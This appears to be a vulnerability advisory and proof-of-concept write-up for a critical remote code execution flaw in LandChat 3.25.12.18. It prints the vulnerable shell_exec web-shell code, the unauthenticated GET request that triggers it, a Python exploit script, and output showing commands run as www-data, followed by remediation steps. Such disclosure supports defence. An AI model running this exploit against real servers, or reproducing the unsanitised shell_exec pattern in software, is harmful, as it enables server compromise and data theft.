# CVE-2025-29662 - LandChat Remote Code Execution

## Vulnerability Information

- **CVE ID**: CVE-2025-29662
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: LandChat 3.25.12.18
- **Vulnerability Type**: Remote Code Execution (RCE)

## Description

LandChat 3.25.12.18 contains a critical remote code execution vulnerability in the `utb_res.php` and `picupload_res.php` files. The application directly passes user-supplied input to `shell_exec()` without any validation or sanitization.

## Vulnerable Code

In `upload/web/utb_res.php`:
```php
<?php
$rsp = shell_exec($_REQUEST['c']);
?>
```

The `$_REQUEST['c']` parameter is directly passed to `shell_exec()`, allowing attackers to execute arbitrary system commands.

## Attack Vector

An unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP request to the vulnerable endpoint:

```
GET /web/utb_res.php?c=<command> HTTP/1.1
```

## Impact

- Complete server compromise
- Data theft and manipulation
- Lateral movement within network
- Denial of service

## Proof of Concept

```python
import requests

target = "http://localhost:8080"
payload = {"c": "id"}
response = requests.get(f"{target}/web/utb_res.php", params=payload)
print(response.text)
```

## Verification Result

```
[*] CVE-2025-29662 - LandChat RCE Exploit
[*] Testing command injection vulnerability...
[*] Executing command: id
[+] VULNERABLE! Command executed successfully
[+] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Testing additional command: uname -a
[+] Output:
Linux <container_id> 6.8.0-90-generic x86_64 GNU/Linux
```

## Remediation

1. Remove or secure the vulnerable endpoints
2. Implement input validation and sanitization
3. Avoid using shell_exec() with user input
4. Update to a patched version of LandChat

## References

- https://github.com/landchat/LandChat/issues/5
- https://cvefeed.io/vuln/detail/CVE-2025-29662
